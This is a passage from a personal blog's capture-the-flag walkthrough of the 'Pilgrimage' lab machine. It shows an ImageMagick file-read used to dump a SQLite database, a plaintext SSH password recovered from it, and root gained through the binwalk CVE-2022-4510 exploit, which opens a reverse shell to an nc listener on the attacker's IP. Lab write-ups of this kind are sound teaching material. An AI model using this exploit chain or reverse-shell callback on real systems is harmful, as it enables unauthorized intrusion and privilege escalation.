</span></span><span style=display:flex><span>index.php:27:      exec(<span style=color:#0086d2>&#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&#34;</span> . <span style=color:#fb660a>$upload</span>-&gt;getName() . <span style=color:#fb660a>$mime</span> . <span style=color:#0086d2>&#34; -resize 50% /var/www/pilgrimage.htb/shrunk/&#34;</span> . <span style=color:#fb660a>$newname</span> . <span style=color:#fb660a>$mime</span>);
</span></span><span style=display:flex><span>index.php:31:        <span style=color:#fb660a>$db</span> = new PDO(<span style=color:#0086d2>&#39;sqlite:/var/db/pilgrimage&#39;</span>);
</span></span><span style=display:flex><span>login.php:12:  <span style=color:#fb660a>$db</span> = new PDO(<span style=color:#0086d2>&#39;sqlite:/var/db/pilgrimage&#39;</span>);
</span></span><span style=display:flex><span>register.php:12:  <span style=color:#fb660a>$db</span> = new PDO(<span style=color:#0086d2>&#39;sqlite:/var/db/pilgrimage&#39;</span>);
</span></span></code></pre></div><p>So let&rsquo;s use the imagemagick exploit, let&rsquo;s generate an image and shrink it the web app and review the resultant image&rsquo;s metadata in order to get the database content:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ sqlite3 download.sqlite
</span></span><span style=display:flex><span>SQLite version 3.42.0 2023-05-16 12:36:15
</span></span><span style=display:flex><span>Enter <span style=color:#0086d2>&#34;.help&#34;</span> <span style=color:#fb660a;font-weight:700>for</span> usage hints.
</span></span><span style=display:flex><span>sqlite&gt; .tables
</span></span><span style=display:flex><span>images  users
</span></span><span style=display:flex><span>sqlite&gt; <span style=color:#fb660a;font-weight:700>select</span> * from users;
</span></span><span style=display:flex><span>emily|abigchonkyboi123
</span></span></code></pre></div><p>And the credentials worked for emily&rsquo;s SSH:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>emily@pilgrimage:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(emily) <span style=color:#fb660a>gid</span>=1000(emily) <span style=color:#fb660a>groups</span>=1000(emily)
</span></span></code></pre></div><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>After getting <code>pspy64</code> I got this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>...
</span></span><span style=display:flex><span>s2023/07/20 09:58:30 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>743</span>    | /lib/systemd/systemd-logind
</span></span><span style=display:flex><span>1./07/20 09:58:30 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>739</span>    | /bin/bash /usr/sbin/malwarescan.sh
</span></span><span style=display:flex><span>2./07/20 09:58:30 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>738</span>    | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
</span></span><span style=display:flex><span>3./07/20 09:58:30 CMD: <span style=color:#fb660a>UID</span>=<span style=color:#0086f7;font-weight:700>0</span>     <span style=color:#fb660a>PID</span>=<span style=color:#0086f7;font-weight:700>724</span>    | /bin/bash /usr/sbin/malwarescan.sh
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>blacklist</span>=(<span style=color:#0086d2>&#34;Executable script&#34;</span> <span style=color:#0086d2>&#34;Microsoft executable&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span style=color:#fb660a;font-weight:700>while</span> read FILE; <span style=color:#fb660a;font-weight:700>do</span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a>filename</span>=<span style=color:#0086d2>&#34;/var/www/pilgrimage.htb/shrunk/</span><span style=color:#fb660a;font-weight:700>$(</span>/usr/bin/echo <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$FILE</span><span style=color:#0086d2>&#34;</span> | /usr/bin/tail -n <span style=color:#0086f7;font-weight:700>1</span> | /usr/bin/sed -n -e <span style=color:#0086d2>&#39;s/^.*CREATE //p&#39;</span><span style=color:#fb660a;font-weight:700>)</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a>binout</span>=<span style=color:#0086d2>&#34;</span><span style=color:#fb660a;font-weight:700>$(</span>/usr/local/bin/binwalk -e <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$filename</span><span style=color:#0086d2>&#34;</span><span style=color:#fb660a;font-weight:700>)</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>for</span> banned in <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>blacklist</span>[@]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>; <span style=color:#fb660a;font-weight:700>do</span>
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>if</span> [[ <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$binout</span><span style=color:#0086d2>&#34;</span> == *<span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$banned</span><span style=color:#0086d2>&#34;</span>* ]]; <span style=color:#fb660a;font-weight:700>then</span>
</span></span><span style=display:flex><span>                        /usr/bin/rm <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$filename</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>                        break
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>fi</span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>done</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>done</span>
</span></span></code></pre></div><p>That is using binwalk v2.3.2, here is a vuln for it:
<a href=https://www.exploit-db.com/exploits/51249>https://www.exploit-db.com/exploits/51249</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ python exploit.py any_image_here.jpeg <span style=color:#fb660a>$YOUR_IP</span> <span style=color:#0086f7;font-weight:700>9999</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>------------------CVE-2022-4510----------------
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>################################################</span>
</span></span><span style=display:flex><span>--------Binwalk Remote Command Execution--------
</span></span><span style=display:flex><span>------Binwalk 2.1.2b through 2.3.2 included-----
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>You can now rename and share binwalk_exploit and start your local netcat listener.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>➤ scp binwalk_exploit.png emily@pilgrimage.htb:~/
</span></span><span style=display:flex><span>binwalk_exploit.png                                               100% <span style=color:#0086f7;font-weight:700>4200</span>    26.8KB/s   00:00
</span></span></code></pre></div><p>From the app server:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/foo.png
</span></span></code></pre></div><p>Opening a port for reverse shell connection:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ nc -lvnp <span style=color:#0086f7;font-weight:700>9999</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.219:41146
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span><span style=display:flex><span>cd /root
</span></span><span style=display:flex><span>cat root.txt
</span></span><span style=display:flex><span>XXXXXXXXXXXX
</span></span></code></pre></div><p>And we are done now.</p><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Learn how to dump an hex string into a bin file</li><li>Learn how to use pspy64</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>